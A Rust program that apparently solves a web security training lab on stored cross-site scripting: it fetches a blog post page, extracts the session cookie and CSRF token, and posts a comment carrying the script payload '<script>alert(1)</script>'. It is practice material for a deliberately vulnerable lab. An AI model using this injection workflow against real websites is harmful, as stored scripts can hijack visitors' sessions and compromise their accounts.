/**************************************************************************
*
* Lab: Stored XSS into HTML context with nothing encoded
*
* Hack Steps: 
*      1. Fetch a post page
*      2. Extract the session cookie and the csrf token to post a comment
*      3. Post a comment with the injected payload in the comment field
*
***************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a8100fb034ec1be82ad2f2f003500bf.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching a post page.. ");
    flush_terminal();

    let post_page = fetch("/post?postId=1");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ");
    flush_terminal();

    let session = get_session_cookie(&post_page);
    let csrf_token = get_csrf_token(post_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Posting a comment with the injected payload in the comment field.. ");
    flush_terminal();

    let payload = "<script>alert(1)</script>";
    post_comment(&payload, &session, &csrf_token);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn post_comment(comment: &str, session: &str, csrf_token: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("postId", "1"),
            ("name", "Hacker"),
            ("email", "hack@me.com"),
            ("comment", comment),
            ("csrf", csrf_token),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to post a comment with the injected payload in the comment field".red()
        ));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
